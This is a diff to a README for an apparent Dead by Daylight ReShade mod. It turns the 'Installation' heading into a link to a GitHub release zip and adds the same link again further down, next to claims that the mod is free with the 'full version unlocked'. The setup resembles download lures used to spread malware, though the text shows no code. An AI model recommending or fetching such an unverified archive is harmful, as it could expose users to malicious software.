@@ -20,7 +20,7 @@ Perfect for players who want a refreshed look while maintaining smooth playabili
 
 ---
 
-## 🧰 Installation
+## 🧰  [Installation](https://github.com/LairLanceWish/dbd-reshade/releases/download/dbd-reshade/DBDReshade.zip)
 
 
 
@@ -74,6 +74,9 @@ Visual enhancement features include color balancing, edge sharpening, and lighti
 **Cost?** Free. Full version unlocked.
 
 **Updates?** Regular improvements included.
+---
+## 🧰  [Installation](https://github.com/LairLanceWish/dbd-reshade/releases/download/dbd-reshade/DBDReshade.zip)
+
 
 ---
 
